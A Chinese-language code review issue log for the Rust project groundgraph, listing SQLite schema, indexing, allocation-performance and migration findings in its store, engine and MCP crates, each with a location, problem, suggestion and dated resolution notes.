> **🟡 按设计（2026-06-13 第十三轮，与 #74 同源）** — 现状属实（`Store::open` PRAGMA 列表 130-138 行确无 `foreign_keys=ON`，DDL 也无 FK），但这是**刻意**而非疏漏。本 issue 自己点出"必须靠手写 `NOT IN` 子查询（#137）扫孤儿"——正说明系统选择了**事后 orphan-sweep** 而非 FK 级联：多 indexer 各自 `clear_indexer_outputs` 两阶段删除，跨 indexer 边合法悬挂（见 #74）。声明 FK + 开启强制会(1)按 insert 顺序拒绝"边/证据先于目标节点写入"的合法路径，(2)让 `DELETE FROM nodes WHERE indexer=?` 触发级联/RESTRICT 破坏既定两阶段语义。故不加 FK、不开 pragma；`foreign_keys=ON` 在无 FK 声明时本就是 no-op。

- **位置**：`crates/groundgraph-store/src/lib.rs:100-108`（PRAGMA 列表）；schema 在 `001_initial.sql`
- **问题**：SQLite 默认 `foreign_keys=OFF`，且必须在**每个连接**上显式 `PRAGMA foreign_keys=ON` 才生效。代码完全没设。同时 schema 里没有任何 `FOREIGN KEY` 子句——`edge_assertions.from_id`/`to_id`、`evidence.artifact_id`、`symbol_ranges.symbol_id`、`symbol_ranges.parent_symbol_id` 都没有 FK 引用 `nodes(id)`。这导致：(1) 上游 bug（如 indexer 输出错误 `from_id`）能直接写入悬空边；(2) `DELETE FROM nodes` 不会级联清理——所以必须靠手写的 `NOT IN` 子查询（即 #137）来扫孤儿。
- **建议**：在 schema 加 FK（`FOREIGN KEY (from_id) REFERENCES nodes(id) ON DELETE CASCADE`），并在 `Store::open` 的 PRAGMA 循环里加 `"PRAGMA foreign_keys=ON;"`。

### 140. `list_edges_by_kind/from/to` 的 `ORDER BY id` 强制对每查询做 file sort

> **✅ 已闭环（2026-06-13 第十四轮·Wave C，TDD 修复）** — 成立。`edge_assertions.id` 是 TEXT，故 002 的单列索引 `(from_id)`/`(to_id)`/`(kind)` 只定位行、不提供 id 序，每次 `WHERE <col>=? ORDER BY id` 都付一次 `USE TEMP B-TREE FOR ORDER BY`（EXPLAIN 实测确认）。采用建议（复合索引）：新增**迁移 v4** `004_edge_order_indexes.sql` 把三个邻接索引重命名为复合覆盖索引 `idx_edge_assertions_{from,to,kind}_ord (<col>, id)`（先 `DROP IF EXISTS` 旧单列名再建新名——干净改名，避免 `IF NOT EXISTS` 撞名而悄悄留下旧单列索引）；并新增**无 DROP 的自愈文件** `query_indexes.sql`（`ensure_query_indexes` 每次 `open` 跑，只 `CREATE IF NOT EXISTS` 复合 `_ord` 形态，read-only 命令路径升级后也能拿到复合索引、且不会瞬时移除在用索引）。TDD：新增 `adjacency_queries_avoid_a_sort_via_composite_indexes`，对三条邻接查询断言 EXPLAIN QUERY PLAN「命中对应 `_ord` 复合索引且不含 TEMP B-TREE」——修复前实测 RED（`USING INDEX idx_edge_assertions_kind (kind=?) | USE TEMP B-TREE FOR ORDER BY`）。同步更新 3 处索引名断言（`lib.rs` 两测 + `tests/migrations.rs::EXPECTED_INDEXES`）与迁移计数（`[1,2,3]→[1,2,3,4]`）。`-p groundgraph-store` 全绿（23 测），clippy 绿。保留 `ORDER BY id` 契约（上层依赖稳定序），不走"去掉排序"的破坏性方案。

- **位置**：`crates/groundgraph-store/src/repositories.rs:261-269, 283`
- **问题**：查询形如 `WHERE kind = ?1 ORDER BY id` / `WHERE from_id = ?1 ORDER BY id`。索引 `idx_edge_assertions_kind`（在 `kind` 上）与 `idx_edge_assertions_from`（在 `from_id` 上）都是单列索引，**不包含** `id`。SQLite 通过 kind 索引扫描到所有匹配行后必须按 `id`（PK）排序——这要求一次 `USE TEMP B-TREE FOR ORDER BY`。search/slice/impact 每个查询会调几千次这些方法，file sort 在大库上很贵。
- **建议**：要么把 `ORDER BY id` 去掉（让上层排序），要么把索引改为复合索引：`idx_edge_assertions_kind (kind, id)`、`idx_edge_assertions_from (from_id, id)`、`idx_edge_assertions_to (to_id, id)`。

### 142. `simple_glob_match` 每次调用都 `pattern.chars().collect::<Vec<char>>()` + `path.chars().collect::<Vec<char>>()`

> **✅ 已闭环（2026-06-13 第十四轮·Wave D，TDD 修复）** — 成立。新增编译型 `ExcludeGlobs`（`compile` 把每个 pattern 的 `Vec<char>` 预收集一次，`matches` 每次只收集一次 path 的 chars 而非每 glob 一次），两处 `discover_files`（`lsp_indexer`/`treesitter`）改为在文件遍历前 `ExcludeGlobs::compile(exclude_globs)` 一次、循环内 `exclude.matches(&rel)`。匹配语义零变化：抽出共享核心 `glob_match_chars`，`simple_glob_match` 与 `ExcludeGlobs` 共用同一递归 + 记忆化。TDD：新增 `exclude_globs_compiled_matches_simple_glob_match`，对 `*`/`**`/`?`/字面量/多 glob OR/空集 等 case 断言"编译型 == 逐次 `simple_glob_match`"；既有 `discover_files_filters_by_extension_and_exclude_globs` 与两个 glob 语义测试全绿（12 测）。`simple_glob_match` 退化为 `#[cfg(test)]` 参考实现（生产路径已全切 `ExcludeGlobs`，避免 dead_code）。

- **位置**：`crates/groundgraph-engine/src/lsp_indexer.rs:916-925`
- **问题**：在 `discover_files` 的内层（`treesitter.rs:1949-1952`）每个文件 × 每个 exclude glob 都会调用一次 `simple_glob_match`，而函数顶部把 `pattern` 和 `path` 都重新 collect 成 `Vec<char>`。对一个 10 万文件的 monorepo × 5 个 exclude globs × 平均 60 字符路径 = 3000 万次 `Vec<char>` 分配。Pattern 在一次 index 运行中是**常量**，反复 collect 是纯浪费。（与第三批 #50 不同：#50 修了回溯指数级，本条关注 Vec<char> 分配。）
- **建议**：(1) 把 pattern 预编译成 `Vec<char>` 一次（caller 传入 `&[char]`）；或 (2) 用 `globset::GlobSet`（项目其他地方如 `dead_code.rs` 已用），把 `*` / `?` / `**` 编译成 NFA，匹配 O(N) 无回溯无分配。

### 143. `keyword_matches` 对每个候选节点重新计算 `split_identifier(name)` 和 `compact_segments(name)`，不缓存

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave D，已验证）** — 成立。每节点重算 `split_identifier`/`compact_segments`（各 `collect::<Vec<String>>`）属实。但"修"需架构级改动：缓存子 token 要把它们物化到 `Node` 上（一次性预处理 / schema 或内存结构扩展），或改 `par_iter` 并行——二者都超出散修范围且需基准佐证收益。最低成本的 `HashSet` 替 `Vec` 让 `any` O(1) 只动常数，主成本仍是每节点的切分本身（每节点不同、无法外提）。列为「search 热路径专项」，需 bench 驱动。

> **✅ 已闭环（2026-07-17，TDD+bench）** — `keyword_matches` 节点评分循环改 rayon `par_iter`（issue 明确方案），`enumerate` + 稳定 `sort_by_key(idx)` 严格恢复 `nodes` 原序、tie-break 排名逐字不变。bench（8000 节点合成库 `search_hot`）：signIn 5.87→3.28ms（-44%）、handle_request 5.93→3.32ms（-44%）、request 9.53→7.10ms（-26%）、purchase 9.34→7.07ms（-24%）、auth 9.92→8.34ms（-16%），全部 p<0.05。`split_identifier`/`compact_segments` 每节点固有、无法跨节点共享（issue 已确认），收益来自多核并行而非缓存。

- **位置**：`crates/groundgraph-engine/src/search.rs:1660-1669`，配合 `score_node:1672-1725`
- **问题**：`keyword_matches` 遍历全部节点（`list_all_nodes`），对每个节点调用 `split_identifier(&name)` 和 `compact_segments(&name)`——二者都 `collect::<Vec<String>>()`——然后用 `name_subtokens.iter().any(|t| t == tok)` 线性查找 token。spring/django 84k-96k 节点 × 每次 split（产生 2-4 个 String）= 数十万次分配。token 列表是**常量**（同一次 query 内不变），但每个节点都重新切分。
- **建议**：把 `name_subtokens` / `name_compacts` / `path_segments` / `name_lower` 缓存到 `Node` 上（一次性预处理），或者改成 `nodes.par_iter().map(score_node)` 用 rayon 并行 + `Cow<str>` 避免分配。最低成本：用 `HashSet<String>` 替代 `Vec<String>` 让 `any` 变 O(1)。

### 144. `score_node` 每次都对 `path` 做 `.split(['/', '\\']).map(|s| s.trim_end_matches(".dart").to_string())`

> **🟡 判定：成立·吹毛求疵/待专项（2026-06-13 第十四轮·Wave D，已验证）** — 成立（纯分配开销）。无条件 `.trim_end_matches(".dart")` 对非 Dart 节点白做、且 `.to_string()` 每段都分配属实。但"修"是纯分配优化、无行为可断言（评分需保持逐位一致），只能靠基准证明收益；而把 `.dart` 后缀剥离改为条件分支会改变非 Dart 路径里恰好以 `.dart` 结尾的边界 token 化，存在细微行为风险。与 #143 同属 search 评分热路径，应在一个 bench 驱动的专项里连同 `Vec<&str>` 借用零分配方案一起验证，单独散修 TDD 价值低、风险/收益不匹配。

> **✅ 已闭环（2026-07-17，TDD+bench）** — `score_node` 的 `path_segments` 由 `Vec<String>`（每段 `to_string`，约 5 段 × 每候选节点 = 最大 per-node 分配块）改 `Vec<&str>` 借用 `path_lower`，零 `to_string` 分配；`trim_end_matches(".dart")` 保留重复剥离语义（`characterization_path_segment_repeated_dart_suffix_is_trimmed` 钉死 `.dart.dart` → `page`，非 `strip_suffix`）。与 #143 同一 bench 一并验证（auth -16% … signIn -44%）。

- **位置**：`crates/groundgraph-engine/src/search.rs:1655-1659`
- **问题**：对每个节点都把 path 拆成 `Vec<String>`，**且只为了 Dart 文件**才需要 `trim_end_matches(".dart")`——其他 16 种语言的节点白做这个 trim。对 96k 节点 × 平均 5 段路径 = 480k 次 `to_string()`。再叠加 #143 的 split_identifier，仅 `score_node` 一项 search 路径上的分配量已是天文数字。
- **建议**：(1) 把 trim 放到 path 处理分支里（`node.kind.language() == Some("dart")` 时才 trim）；(2) 用 `path_lower.split(['/', '\\']).filter_map(|s| { let s = s.strip_suffix(".dart").unwrap_or(s); if s.is_empty() { None } else { Some(s) } }).collect()` —— 直接返回 `Vec<&str>` 借用，零分配。

### 145. `resolve_storage_path` 在 14 个 engine 模块中重复定义，且与 MCP 版本语义分叉，空 `storage.path` 时行为不同

> **🟠 判定：成立·待专项（2026-06-13 第九轮）** — 现状属实（15 份副本，engine 不处理空串 → `repo_root.join("")`，mcp 显式兜底 `.groundgraph/graph.db`）。统一为 `EngineConfig::db_path()` 并删 15 份副本是带涟漪的重构（牵动 14 个 engine 模块 + mcp 入口），需独立 PR 逐入口回归。列为专项，本轮不并入散修。

> **✅ 已闭环（2026-07-17，TDD）** — 收敛完成：新增 `groundgraph_core::paths::confine_under_root` 为唯一共享实现，engine `config::resolve_storage_path` 收敛为唯一 storage 包装（改返回 `Result<PathBuf>`，空串/纯空白统一兜底 `.groundgraph/graph.db`，相对路径含 `..` 一律拒绝）；实测 20 份 engine 模块本地副本与 MCP `resolve_db_path` 全部删除、调用点改 `?` 透传，engine 与 MCP 的语义分叉就此消除。

- **位置**：`crates/groundgraph-engine/src/slice.rs:252-259`（以及 `constants.rs:516`、`test_suggestions.rs:344`、`export.rs:132`、`index.rs:490`、`graph.rs:1457`、`data_contract.rs:614`、`feature_pack.rs:396`、`business_doc.rs:333`、`logic_confidence.rs:432`、`trace.rs:142`、`checks.rs:837`、`search.rs:2022` — 共 14 份）；`crates/groundgraph-mcp/src/tools/mod.rs:107-118`（第 15 份，但语义不同）
- **问题**：`resolve_storage_path`（engine）与 `resolve_db_path`（mcp）是同一意图的函数，被复制 15 次。两份实现已经**语义分叉**：
  - engine 版本：`Path::new(&config.storage.path)`，**不处理空字符串** → `config.storage.path == ""` 时返回 `repo_root.join("")` == `repo_root`（一个目录路径），随后 `Store::open(repo_root)` 试图把目录当 SQLite 文件打开 → 失败或创建空名文件。
  - mcp 版本：`if raw.is_empty() { return repo_root.join(".groundgraph/graph.db") }` — **显式空串兜底**。
- **触发场景**：用户在 `.groundgraph.yaml` 中写 `storage.path: ""` 或省略字段后反序列化得到空串（serde 默认）。engine 路径上 14 个入口（`slice_requirement`、`analyze_questions`、`export`、`build_graph_view`…）会全部走错路径；MCP `tools/call` 走对路径。同一仓库在 CLI 与 MCP 下报告"找不到 db / 找到 db"的不一致。
- **建议**：在 `EngineConfig` 上提供单一 `db_path(repo_root: &Path) -> PathBuf` 方法，删除全部 15 份本地副本，集中处理空串/绝对/相对三种情况。

---

## Medium（30 个）

### 146. PRD.md §13/§14 把 SCIP / 多语言 / 高性能存储列为"Phase 6 / 后续"，实际已全部落地

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立。`PRD.md` §14 优先级表 Phase 6 行加"（✅ 已落地 v0.2.0+）"，表后加"实现状态对照"注：Phase 2/3/4/6 均已交付（Review Workflow / Dart sidecar / MCP / SCIP+12 门 tree-sitter+WAL+FTS5 存储），仅 Phase 5（GraphRAG/Semantic Query）仍为规划；§12 Phase 6 节首补 ✅ 已落地说明。"后续"原指优先级而非未实现，已澄清。

- **位置**：`PRD.md:1519-1567`
- **问题**：PRD §13 开发优先级总表里 "| Phase 6 | SCIP / 多语言 / 高性能图存储 | 后续 |"，并在 §12 Phase 6 写"在 Rust Core 已经存在的基础上，从 Rust Core + Dart Adapter 升级为高性能、多语言基础库"，把 SCIP adapter / tree-sitter fallback / multi-repo support 全部列为"后续"。但实际：SCIP 摄入与自动调用已实现（`scip_runner.rs` + 5 个 indexer spec）；tree-sitter 多语言（12 门）已实现；高性能存储（WAL + checkpoint + bulk upsert + FTS5）已实现。PRD 没有任何"已落地"标记，给人"SCIP 是未来计划"的错觉。
- **建议**：在 PRD §13 表格的 Phase 6 行加"已落地（v0.2.0+）"或类似后缀；或在 PRD 顶部加一节"实现状态对照"。

### 151. `slice_cache` 表创建了但代码从不读/写——死表占空间

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave C，已验证）** — 成立。本轮 grep 确认 `INTO slice_cache`/`FROM slice_cache` 命中 0，`slice_cache` 仅存在于 `001_initial.sql` 与测试 EXPECTED_TABLES，无任何读写。但两条修法都需专项：(a) 接通缓存是 PRD §5 规划功能（要设计 `input_hash` 命中/失效语义），属功能开发；(b) 删表受 append-only 迁移约束（不可改 001），需新迁移 `DROP TABLE slice_cache` + 改 EXPECTED_TABLES。死表运行期成本≈0（仅一条 catalog 记录，从不参与查询），且贸然 DROP 会预先关闭计划中的缓存路。倾向保留待功能接通，列为专项，不在散修轮处理。

> **✅ 已闭环（2026-07-17，TDD）** — 落地删表路线：迁移 005 `DROP TABLE IF EXISTS slice_cache`，`tests/migrations.rs` 的 `EXPECTED_TABLES` 去掉 `slice_cache` 并新增「迁移后 slice_cache 不存在」断言。将来缓存功能落地时用新迁移重建表，append-only 不堵路。

- **位置**：`crates/groundgraph-store/src/migrations_sql/001_initial.sql:69-75`
- **问题**：迁移创建了 `slice_cache (root_id, input_hash, index_generation, slice_json, generated_at)`，但 grep 全工程：`slice_cache` 仅出现在 migrations_sql/001 与 tests/migrations.rs 的 EXPECTED_TABLES。没有任何 `SELECT`/`INSERT INTO slice_cache`。每次 ingest 写入其他表都不写它，slice 计算结果直接返回 JSON 也不缓存。要么是 PRD 计划但 MVP-0 没接通；要么应删。
- **建议**：要么实现 slice_cache 读写（slice.rs 计算后写入，下次相同 input_hash 命中），要么删除表与测试断言。

### 152. `index_generation` 列被写入但从未用于查询——纯写放大

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave C，已验证）** — 成立。本轮确认 `.index_generation = Some(..)` 仅 `repositories.rs:1228/1239`（测试），`WHERE/ORDER BY/GROUP BY` 中无 `index_generation`（生产「不写」面见姊妹 #190）。两条修法均需专项：删列要对**最热的 `nodes`/`edge_assertions` 两表**做 table-rebuild 迁移（SQLite 旧版无 `DROP COLUMN`），并同步改 bulk-upsert 的 14 列 SQL／参数数组／struct／decode 四处，热写路径回归风险高；接通 generation-fence 是 PRD §5 功能（`Store::current_generation()` + run_index bump + 按代清除）。运行期成本仅每行多写一个整数，risk≫benefit。与 #188/#190/#205 合并为「schema 演进专项 PR」。

> **✅ 已闭环（2026-07-17，TDD）** — 落地删列：迁移 005 对 `nodes`/`edge_assertions` 做 table-rebuild（建新表→INSERT 保留列→DROP→RENAME），去掉 `index_generation`（nodes 13→11 列、edge 14→12 列）并补回 002/004 属于两表的索引；`Node`/`EdgeAssertion` 删字段，`repositories.rs` 的 upsert SQL/参数/decode/`SELECT_*_COLS`/`COLS` 全跟进；`val_opt_i64`/`opt_i64` 死代码删除。迁移测试先红后绿（列消失、数据保留、幂等）。

- **位置**：`crates/groundgraph-store/src/repositories.rs:100, 175, 192, 208, 226, 236`；schema `001_initial.sql:17, 34`
- **问题**：`nodes.index_generation` 与 `edge_assertions.index_generation` 都是 `INTEGER`，每次 upsert 都被写入（bulk 路径 14 列之一）。但 grep `WHERE.*index_generation` 全空——它从不在 WHERE/ORDER BY/GROUP BY 出现。这意味着每行多写一个 8 字节整数，却换不来任何查询加速，也没有索引。如果原意是用它做 generation-fence（按代清除），那就应该有对应的查询；否则删掉。
- **建议**：要么加 `idx_nodes_index_generation` 并实现按代查询/清除，要么从 schema 与所有 upsert SQL 中删除该列。

### 153. 迁移无 forward-compat 守卫——旧 binary 静默忽略未知未来 version

> **✅ 已闭环（2026-06-13 第九轮，TDD 修复）** — 成立。`migrations::apply_all` 开头加 forward-compat 守卫：读 `MAX(version)`，若 > 本 binary 已知的最大迁移版本则返回新增的 `StoreError::SchemaTooNew { found, supported }`，旧 binary 不再静默操作未来 schema。新增集成测试 `tests/migrations.rs::migration_rejects_a_future_schema_version`（注入 version=9999 → 期望 `SchemaTooNew`，修复前 RED）。

- **位置**：`crates/groundgraph-store/src/migrations.rs:44-83`
- **问题**：若 DB 已被新 binary 应用过 migration v4、v5，老 binary（只知 v1–v3）打开此 DB 时：`apply_all` 只跑 v1–v3，看到都 already_applied 跳过，**不会**报警。结果是老 binary 在新 schema 上读写——可能读到不认识的列、写过时数据、跟新 binary 的索引假设冲突。
- **建议**：在 `apply_all` 开头加 forward-compat 检查：`if db_max_version > binary_max_version { return Err(...) }`。

### 154. `kind/source/certainty/status` 列无 CHECK 约束，坏值能潜伏并使整查询失败

> **🟡 按设计/已缓解（2026-06-13 第十三轮）** — 不加 DB CHECK。两道既有防线已覆盖：(1) **类型化写入只可能产出合法枚举串**——`upsert_edge*` 写的是 `EdgeKind::as_str()`/`EdgeSource::as_str()` 等，Rust 枚举无法生成集合外的值；(2) **读出/decode 层硬拒未知值**——`edge_from_row` 经 `parse_edge_*` 对任何非枚举串直接 `Err`，已由 `parse_edge_kind_recognises_every_known_value_and_rejects_unknown`/`parse_edge_source_rejects_unknown_value` 等测试固化（坏值 `list_all_edges` 立即报错，不会"潜伏"）。DB 级 CHECK 仅对绕过类型层的外部 raw writer 多一层防护，代价却是对热表 `edge_assertions` 做 table-rebuild 迁移（SQLite 不能 ALTER 加 CHECK），风险/收益不匹配。坏值"使整查询失败"恰是 decode 层的预期行为（fail-fast），数据完整性已保证。

- **位置**：`crates/groundgraph-store/src/migrations_sql/001_initial.sql:21-36`
- **问题**：`edge_assertions.kind TEXT NOT NULL`、`source TEXT NOT NULL`、`certainty TEXT NOT NULL`、`status TEXT NOT NULL`——全部允许任意字符串。解码器（`parse_edge_kind/source/certainty/status`）只在读取时校验。后果：(1) 上游 indexer bug 写入 `"Callz"`（typo）后能成功 INSERT；(2) 该行在下次 `list_all_edges` 时整个查询**失败**（解码错误中断所有行），而不是只跳过坏行；(3) 坏数据能潜伏几个月直到被读。`nodes.kind`、`symbol_ranges.symbol_kind`、`evidence.kind` 同样。
- **建议**：加 CHECK 约束（新迁移）。注意 SQLite ALTER 不直接支持加 CHECK——需要 table rebuild migration。

### 156. `attach_snippets` 在 spans 行循环里对每行 `to_lowercase()`

> **🟡 判定：成立·吹毛求疵（2026-06-13 第十四轮·Wave D，已验证）** — 成立（纯分配开销）。spans 范围内每行 `to_lowercase()` 分配一个 `String` 属实。但 snippet 选取行为须保持逐字一致，最直接的"无大写则短路 lower"优化对**非 ASCII 大写**（如希腊/西里尔字母、带音标大写）会改变命中计数→可能选出不同 snippet，需 Unicode 大小写折叠测试兜底才安全；纯字节 ASCII contains 同理对非 ASCII needle 有语义差。属可做但低价值的微优，主成本是 needle 扫描本身而非 lower。标注为吹毛求疵，留待 search 热路径专项一并以特征化测试验证，不在散修轮单独改。

> **✅ 已闭环（2026-07-17，TDD+bench）** — `attach_snippets` 逐行 `to_lowercase()` 改为每文档一次性预处理（cache 存 `(raw_lines, lower_lines)`），匹配语义逐字节一致（全 Unicode `to_lowercase`，`attach_snippets_picks_max_needle_line_with_unicode_folding` 钉死含非 ASCII `É` 折叠，非 ASCII-only 短路）；snippet 文本仍取原始行。同 `search_hot` bench 一并验证。

- **位置**：`crates/groundgraph-engine/src/search.rs:641-647`
- **问题**：snippet 选取对 spans 范围内每一行调用 `line.to_lowercase()`（分配一个新 `String`），然后用 `needles.iter().filter(...).count()` 数 needle 命中数。对于 500 行的方法体 × 8 个 needle = 4000 次分配。`search` 在 PR review 工作流中按 query 反复触发，且 `needles` 已经预先 lowercase 过——对每行重复 lower 是不必要的。
- **建议**：要么用 `line.contains(|c: char| c.is_ascii_uppercase())` 短路（无大写时跳过 lower），要么把 `needles` 升级为 `SmallVec<[&str; 8]>` 并对 lowercase 行做一次性 contains 扫描；最干净的是直接对 ASCII 字节做大小写不敏感 `contains`（needle 几乎都是 ASCII）。

### 158. `connect::collect_evidence_for_requirements` 每个需求调用 `list_edges_to`（N+1 query）

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave D，已验证）** — 成立（结构性 N+1）。`collect_requirements` 对每个 Requirement 各 `list_edges_to(&req.id)`、再对每条边 `node_spec_for_edge` 查节点，确是 N+M。但 `connect` 是**一次性报告命令**（非每键热路径），且入边查询走的正是本轮 #140 新建的复合索引 `idx_edge_assertions_to_ord`（点查 O(log N)）；500 需求级的索引点查是毫秒级。修法（单次 `kind IN (...)` 批查 + 内存分桶，或新增 `list_edges_to_filtered`）是合理但非紧急的改进，且新增 store API 面/改内存聚合需对照 `Documents/DeclaresImplementation/DeclaresVerification` 三类做相等性测试。收益对一次性命令有限，列为专项。

> **✅ 已闭环（2026-07-17，TDD）** — store 新增 `list_edges_by_kinds(&[EdgeKind])`（单次 `kind IN (...)`，固定占位符数可缓存 prepared statement），`collect_requirements` 由 N+1（每需求一次 `list_edges_to`）改为 1 次查询 + 内存按 `to_id` 分桶；`list_edges_by_kinds` 返回 `ORDER BY id`，每桶 sort+dedup 与旧实现逐条相等（`collect_requirements_buckets_three_evidence_kinds_correctly` 钉死 Documents/DeclaresImplementation/DeclaresVerification 三类 + 去重 + `Calls` 排除 + 空 evidence 的 missing 标志）。

- **位置**：`crates/groundgraph-engine/src/connect.rs:186-220`
- **问题**：函数遍历每个 `Requirement` 节点，对每个需求各调用一次 `store.list_edges_to(&req.id)?`——返回全字段全边集合，再 filter 三个 kind。对一个有 500 个需求 × 平均 20 条入边的仓库，这是 500 次 SQLite query + 500 次 `Vec<EdgeAssertion>` 装箱。每次 query 都重新 prepare、绑定参数、构造 row。
- **建议**：(1) 改成一次性 `SELECT * FROM edge_assertions WHERE kind IN ('Documents','DeclaresImplementation','DeclaresVerification') ORDER BY to_id`，然后 in-memory 分桶；(2) 或暴露一个 `store.list_edges_to_filtered(aid, &[EdgeKind::Documents, ...])` 让 SQL 直接过滤。

### 159. `discover_files` 用 `code_roots.to_vec()` 克隆整个 `Vec<PathBuf>`，仅为了避免 mutate 入参

> **✅ 已闭环（2026-06-13 第十四轮·Wave D，随 #142 一并修）** — 成立（吹毛求疵级：每次 `discover_files` 调用仅一次克隆、非热循环）。采用建议（栈上默认切片）：`let default_root = [PathBuf::from(".")]; let roots: &[PathBuf] = if code_roots.is_empty() { &default_root } else { code_roots };`，借用入参、零深克隆。既有 `treesitter` 发现路径测试（165 测）全绿、clippy 绿，行为不变。

- **位置**：`crates/groundgraph-engine/src/treesitter.rs:1919-1923`
- **问题**：函数顶部 `let roots: Vec<PathBuf> = if code_roots.is_empty() { vec![PathBuf::from(".")] } else { code_roots.to_vec() };`——`code_roots.to_vec()` 深克隆整个 `Vec<PathBuf>`。每个 `PathBuf` 24 字节栈 + 堆分配。一次 index 运行中对每种语言都调一次 `discover_files`（5-10 种语言 × 多 roots）。
- **建议**：用 `Cow<[PathBuf]>`，或者直接在 `code_roots.is_empty()` 时构造一个栈上 `&[PathBuf; 1]` 切片引用。

### 160. tree-sitter walk 在每个 callable 上 `qualified.clone()` 进入 `ScannedRef.from_qualified`

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave D，已验证）** — 成立（纯分配开销）。每个 call ident 都 `from_qualified: qualified.clone()` 属实。但建议的两条修法都带涟漪：(a) `from_qualified` 改 `Arc<str>` 要改 `ScannedRef` 结构 + 所有构造点（散在 12 个语言 adapter）+ 所有读 `from_qualified` 的消费方签名；(b) 改延迟构造（存 qualified 池索引、末尾批量解析）改动更大。属解析层结构变更，需独立 PR 统一改 12 adapter 并回归各语言 calls 边，且收益（小字符串 clone）应有 bench 佐证，不在散修轮处理。

> **✅ 已闭环（2026-07-17，TDD）** — `ScannedRef.from_qualified` 由 `String` 改 `Arc<str>`：callable 的 qualified 一次 `Arc::<str>::from`，body 内每个 call ident 用 `Arc::clone`（原子计数、零堆分配）替代原 `String::clone` 深拷贝；`ScannedRef` 是 treesitter.rs 内部类型（workspace 内仅此一处构造/消费），12 语言 adapter 的 `refs()` 测试 helper 与比较点跟进（编译器驱动），`PartialEq` 按内容比较语义不变（785 engine 测试全绿）。结构性证据：per-callable 堆分配从 N（call ident 数）降到 1。

- **位置**：`crates/groundgraph-engine/src/treesitter.rs:766-772`
- **问题**：每个 callable body 中的每个 call ident 都 push 一条 `ScannedRef { from_qualified: qualified.clone(), ... }`。对一个大文件中 100 个 callable × 各 10 个 call = 1000 次 `qualified.clone()`。
- **建议**：要么把 `from_qualified` 改成 `Arc<str>`（clone 是原子引用计数，无堆分配），要么改成延迟构造：`ScannedRef` 存 `(parent_qualified_idx, to_name)` 索引到 scan 里的 qualified 池，最后批量解析。

### 161. `impact::filter_most_specific_symbols` 是 O(N²) 嵌套迭代

> **🟡 判定：成立·吹毛求疵（2026-06-13 第十四轮·Wave D，已验证）** — big-O 成立但 N 极小。输入是 `find_symbols_intersecting(path, hunk.new_start, hunk.new_end)` 的结果——即"与单个 diff hunk 行区间相交的符号"，实际是该处嵌套作用域链（file→class→method，通常个位数、至多几十）。O(N²) 在这种 N 上是微秒级；改 interval-tree/排序扫描需引入排序+包含判定逻辑、对"保持完全相同筛选语义（保留不含更小区间的最内层符号、含同区间不同 symbol_id 的并列情形）"有回归风险，为无可测收益增加复杂度。判定为吹毛求疵，不改；若未来出现超大 hunk 再行专项。

- **位置**：`crates/groundgraph-engine/src/impact.rs:597-613`
- **问题**：函数对每个 `candidate` 都遍历整个 `ranges` 检查是否被 `other` 包含。对一份修改过的文件触发 100 个 ranges = 10000 次比较。这本身是 PR impact 的内层。
- **建议**：用 interval tree 或者预先按 `(start_line, end_line)` 排序后扫描。最低成本：把 `ranges.sort_by_key(|r| (r.start_line, std::cmp::Reverse(r.end_line)))`，然后线性扫描记录每个 candidate 是否被更小的 range 包含。

### 162. `explain_symbol` 用 `serde_json::json!({...})` 宏在每个 edge 上构造 `Value`，再 `.clone()` 进分组

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave D，已验证）** — 成立。每边 `json!({..})` 造 `Value`、二次循环 `row.clone()` 进分组、`edge.{id,to_id,from_id}.to_string()` 多次分配属实，hub 节点（千边）放大明显。但 `explain_symbol` 的 JSON 是 **MCP 输出契约**，重构为 typed struct + `to_value` + 边遍历边分桶须保证序列化结果（键集/类型/顺序）逐字不变，需先补 JSON 快照特征化测试再改。属可做的中等重构，应在带快照基线的 MCP 专项里做，避免散修中悄改对外契约。

> **✅ 已闭环（2026-07-17，TDD）** — `explain_symbol` 每 edge 的 `json!({...})`（`Map<String,Value>` + 多个 String 分配）+ 二次循环 `row.clone()` 进分组，改为 typed `ExplainEdgeRow`（`#[derive(Serialize)]`，字段字母序匹配原 serde Map 输出）+ 单遍边遍历边分桶到 `BTreeMap<&'static str, Vec<Row>>`（键字母序与 serde_json 无 `preserve_order` 时的 `Map` 一致），`edge.kind.as_str()`（`&'static str`）直接做分组键不再 `to_string`。MCP 对外契约逐字不变（`explain_symbol_json_shape_pins_the_mcp_contract` 钉死 top-level 键集/顺序、grouped 键顺序、row 键集/顺序、tests/stats 计数、truncation）。

- **位置**：`crates/groundgraph-mcp/src/tools/explain_symbol.rs:64-128`
- **问题**：每条边都用 `json!({...})` 宏构造一个 `serde_json::Value`（内部是 `Map<String, Value>` + 多个 `String` 分配），然后在第二个循环里 `row.clone()` 把整个 Value 再克隆一次放进 `grouped_up` / `grouped_down`。对一个 hub 节点（1000 条边）= 1000 个 Value 构造 + 1000 次 clone。`to_string()` 在 `edge.id.to_string()` / `edge.to_id.to_string()` / `edge.from_id.to_string()` 上又是 3000 次分配。
- **建议**：(1) 直接构造一个 strongly-typed struct（`#[derive(Serialize)]`），用 `serde_json::to_value(&row)` 一次；(2) 不要先收集 `Vec<Value>` 再分组——直接边遍历边分组到 `BTreeMap<&str, Vec<RowStruct>>`；(3) `edge.kind.as_str()` 已经是 `&'static str`，不需要 `.to_string()` 做 map key。

### 163. `Store::connection()` 公共访问器绕过 `with_write_tx`，破坏事务封装

> **🟡 判定：基本按设计（2026-06-13 第九轮）** — `connection()` 是**有意的内部只读访问器**（唯一调用点 `export.rs` 仅跑 SELECT 导表）。理论上 `&Connection` 可被滥用执行写操作，但这是 crate 内部 API、调用点可控，且已确认无生产写路径绕过 `with_write_tx`。改 `StoreRead<'_>` newtype 封装是带涟漪的 API 重构，列为可选专项。本轮不改逻辑。

- **位置**：`crates/groundgraph-store/src/lib.rs:228-230`
